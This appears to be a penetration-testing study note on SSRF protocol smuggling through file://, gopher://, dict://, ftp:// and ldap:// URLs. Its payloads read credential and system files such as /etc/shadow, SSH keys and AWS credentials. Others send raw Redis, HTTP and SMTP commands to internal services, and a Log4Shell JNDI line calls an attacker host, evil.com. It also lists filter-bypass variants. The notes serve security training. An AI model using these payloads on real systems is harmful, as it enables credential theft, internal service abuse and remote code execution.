---
tags: [vapt, ssrf, intermediate]
difficulty: intermediate
module: "13 - SSRF"
topic: "13.13 SSRF — Protocol Smuggling (file://, gopher://, dict://, ftp://)"
---

# 13.13 — SSRF Protocol Smuggling

## Why Protocol Matters

```
HTTP IS NOT THE ONLY PROTOCOL FOR SSRF!

When a server-side library (libcurl, urllib, requests) fetches a URL,
it often supports multiple protocols:

✓ http://   → Standard HTTP
✓ https://  → HTTPS
✓ file://   → Read local files
✓ gopher:// → Raw TCP data sending (powerful!)
✓ dict://   → Dictionary protocol (can send raw text to TCP ports)
✓ ftp://    → FTP protocol
✓ ldap://   → LDAP queries
✓ sftp://   → SSH FTP
✓ tftp://   → TFTP
✓ jar://    → Java Archive (Java apps)
✓ netdoc:// → Java (read local files)

DEPENDS ON:
  - What language/library the app uses
  - What protocols are enabled/allowed
  - SSRF filter configuration
```

---

## file:// Protocol

```bash
# READ LOCAL FILES:
url=file:///etc/passwd
url=file:///etc/shadow
url=file:///etc/hosts
url=file:///proc/self/environ        # environment variables!
url=file:///proc/self/cmdline        # process command line
url=file:///proc/net/arp             # network ARP table (find internal IPs!)
url=file:///var/www/html/config.php
url=file:///home/ubuntu/.ssh/id_rsa
url=file:///root/.aws/credentials
url=file:///root/.ssh/authorized_keys

# WINDOWS:
url=file:///C:/Windows/win.ini
url=file:///C:/inetpub/wwwroot/web.config
url=file:///C:/Windows/System32/drivers/etc/hosts

# NOTE: Modern apps often filter file:// explicitly
# Try: file://///etc/passwd (extra slashes)
#      file://localhost/etc/passwd (with host)
#      FILE:///etc/passwd (uppercase)

# USEFUL PROC FILES FOR INTERNAL IP DISCOVERY:
url=file:///proc/net/fib_trie     # all interfaces and IPs!
url=file:///proc/net/tcp          # open TCP connections (hex format)
```

---

## gopher:// Protocol

```
GOPHER IS THE MOST POWERFUL SSRF PROTOCOL!

Gopher allows sending ARBITRARY DATA to any TCP port!
Format: gopher://host:port/_{DATA}
  - host: target host
  - port: target port
  - DATA: URL-encoded bytes to send to the TCP socket!

This means you can interact with ANY TCP protocol:
  Redis commands → gopher://127.0.0.1:6379/_...
  MySQL queries  → gopher://127.0.0.1:3306/_...
  SMTP emails    → gopher://127.0.0.1:25/_...
  HTTP requests  → gopher://127.0.0.1:80/_GET+/admin+HTTP/1.1...

GOPHER IS OFTEN BLOCKED BY FILTERS but worth testing!
```

---

## Gopher Examples

```bash
# REDIS PING VIA GOPHER:
url=gopher://127.0.0.1:6379/_PING%0d%0a
# %0d%0a = \r\n (CRLF, required by Redis protocol)

# REDIS SET KEY:
url=gopher://127.0.0.1:6379/_%2A3%0d%0a%243%0d%0aSET%0d%0a%243%0d%0afoo%0d%0a%243%0d%0abar%0d%0a
# Decoded: *3\r\n$3\r\nSET\r\n$3\r\nfoo\r\n$3\r\nbar\r\n

# HTTP REQUEST VIA GOPHER (to internal HTTP service):
url=gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0a
# Sends: GET /admin HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n

# SMTP EMAIL VIA GOPHER (send spoofed email!):
# Gopherus generates these:
python3 gopherus.py --exploit smtp
# Enter target email, from email, body → gets gopher URL
```

---

## dict:// Protocol

```
DICT = Dictionary Protocol (RFC 2229)
Format: dict://host:port/CMD:arg

CAN INTERACT WITH SOME TCP SERVICES:
  dict://127.0.0.1:6379/PING
  → Sends: CLIENT INFO\r\nPING\r\nQUIT\r\n to Redis port
  → May work on older Redis without gopher support

  dict://127.0.0.1:11211/stats
  → Memcached stats command

  dict://127.0.0.1:9200/_cat/indices
  → Elasticsearch (if server misinterprets)

SSRF FILTER BYPASS:
  Some filters block http:// and file:// but forget dict:// and gopher://!
  Worth testing alternative protocols even if main ones are blocked.
```

---

## ftp:// Protocol

```
FTP CAN BE USED TO:
  1. Read files from FTP servers
  2. PORT command abuse (bounce scanning)

FTP SSRF:
  url=ftp://internal-ftp-server/secret-file.txt
  → If internal FTP server exists, can read files!

  url=ftp://127.0.0.1:21/
  → Confirm FTP service exists locally

FTP ACTIVE MODE BOUNCE:
  FTP active mode: server connects BACK to client for data transfer
  If SSRF can control FTP passive behavior → potential for port scanning
  (More theoretical than practical in modern configs)
```

---

## ldap:// Protocol

```
LDAP SSRF:
  url=ldap://169.254.169.254/
  → Some cloud providers have LDAP-based metadata services
  
  url=ldap://internal-ldap:389/
  → Reach internal directory services
  → May dump LDAP without authentication if anonymous bind allowed!
  
  LDAP INJECTION VIA SSRF:
  If app constructs LDAP queries from URL → LDAP injection + SSRF combo

JAVA LOG4SHELL WAS LDAP SSRF:
  ${jndi:ldap://evil.com/exploit}
  → Java app makes LDAP request to attacker!
  → Attacker serves malicious object → RCE!
```

---

## Detecting Supported Protocols

```bash
# TEST EACH PROTOCOL:
protocols=("file" "gopher" "dict" "ftp" "ldap" "sftp" "tftp")

for proto in "${protocols[@]}"; do
  result=$(curl -s --max-time 5 \
    -X POST "https://target.com/fetch" \
    -d "url=${proto}://YOUR_BURP_COLLABORATOR.burpcollaborator.net/" \
    -H "Cookie: session=YOURS" | head -c 200)
  echo "${proto}://: $result"
done

# BURP COLLABORATOR RECEIVES:
# DNS queries for each protocol the app actually tries
# HTTP requests if app fetches http:// or gopher://
```

---

## URL Scheme Filtering Bypass

```
IF FILTER BLOCKS gopher://:
  Try: GOPHER:// (uppercase)
  Try: Gopher:// (mixed case)
  Try: gopher%3A//  (URL encoded colon)
  Try: gopher:/\127.0.0.1:6379 (slash confusion)
  Try: gopher:///127.0.0.1:6379 (extra slash)

IF FILTER BLOCKS file://:
  Try: FILE:///etc/passwd
  Try: file:///etc/passwd (already standard)
  Try: file://localhost/etc/passwd
  Try: file://///etc/passwd

NOTE: Some SSRF filters use blocklists for schemes
      and miss case variations or alternate forms!
```

---

## Related Notes
- [[12 - SSRF Internal Services]] — attacking services via SSRF
- [[14 - SSRF Localhost Bypass]] — bypassing IP filters
- [[17 - SSRF WAF Bypass]] — protocol and URL bypass techniques
- [[18 - SSRF to RCE via Internal Services]] — RCE via gopher+Redis
